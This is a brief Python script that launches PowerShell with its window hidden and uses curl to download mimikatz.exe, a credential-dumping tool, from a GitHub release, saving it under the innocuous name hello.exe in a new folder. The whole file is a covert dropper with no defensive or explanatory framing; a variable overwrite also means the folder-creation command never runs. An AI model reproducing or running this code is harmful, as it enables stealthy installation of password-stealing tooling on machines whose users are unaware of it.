import subprocess

#powershell command to execute
COMMAND = "mkdir C:\hello"
COMMAND = "curl.exe -L https://github.com/asapthai34-svg/mimikatz/releases/download/mimikatz/mimikatz.exe -o C:\hello\hello.exe" 
 
 
def run_powershell(command: str):
    result = subprocess.run(
        ["powershell", "-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden", "-Command", command],
        capture_output=True,
        text=True,
        creationflags=subprocess.CREATE_NO_WINDOW  # hide CMD
    )
    return result.returncode
 
 
if __name__ == "__main__":
    run_powershell(COMMAND)
